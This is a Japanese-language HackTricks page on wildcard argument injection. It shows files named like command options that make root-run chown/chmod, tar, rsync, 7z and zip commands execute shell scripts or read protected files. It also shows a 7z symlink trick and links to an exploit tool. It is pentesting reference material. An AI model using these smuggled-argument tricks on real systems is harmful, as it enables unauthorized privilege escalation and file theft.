<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>


## chown、chmod

**他のファイルにコピーするファイルの所有者とアクセス許可を指定**することができます。
```bash
touch "--reference=/my/own/path/filename"
```
これを利用することができます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(組み合わせ攻撃)_\
__詳細はこちら [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**任意のコマンドを実行する:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
これを利用することができます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar攻撃)_\
__詳細は[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)を参照してください

## Rsync

**任意のコマンドを実行する:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
この脆弱性は、[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) (_rsync攻撃_) を使用して悪用することができます。\
__詳細は[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)を参照してください。

## 7z

**7z**では、`*`の前に`--`を使用しても（`--`は、次の入力がパラメータとして処理されないことを意味し、この場合はファイルパスのみです）、任意のエラーを引き起こしてファイルを読み取ることができます。したがって、次のようなコマンドがrootによって実行されている場合、悪用することができます。
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
そして、この実行中のフォルダにファイルを作成することができます。`@root.txt`というファイルと、ファイル`root.txt`を作成できます。`root.txt`は、読み取りたいファイルへの**シンボリックリンク**です。
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
その後、**7z**が実行されると、`root.txt`を圧縮すべきファイルのリストを含むファイルとして扱います（これが`@root.txt`の存在を示しています）。そして、7zが`root.txt`を読み込むと、`/file/you/want/to/read`を読み込みますが、**このファイルの内容がファイルのリストではないため、エラーが発生します**。

_詳細は、HackTheBoxのCTFのWrite-upsを参照してください。_

## Zip

**任意のコマンドを実行する：**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
__


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**最新バージョンのPEASSにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
